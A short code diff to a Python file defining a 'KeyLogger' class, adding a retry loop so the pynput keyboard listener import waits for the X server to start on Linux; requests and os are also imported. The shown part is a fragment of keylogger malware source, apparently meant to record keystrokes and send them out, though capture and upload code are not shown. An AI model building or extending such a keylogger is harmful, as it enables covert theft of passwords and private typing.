@@ -1,4 +1,13 @@
-from pynput.keyboard import Listener
+import time
+
+
+while True:
+    try:
+        from pynput.keyboard import Listener
+        break
+    except Exception as e: # For linux to wait for the x-server to start
+        print(e, flush=True)
+        time.sleep(5)
 import requests, os
 
 class KeyLogger:
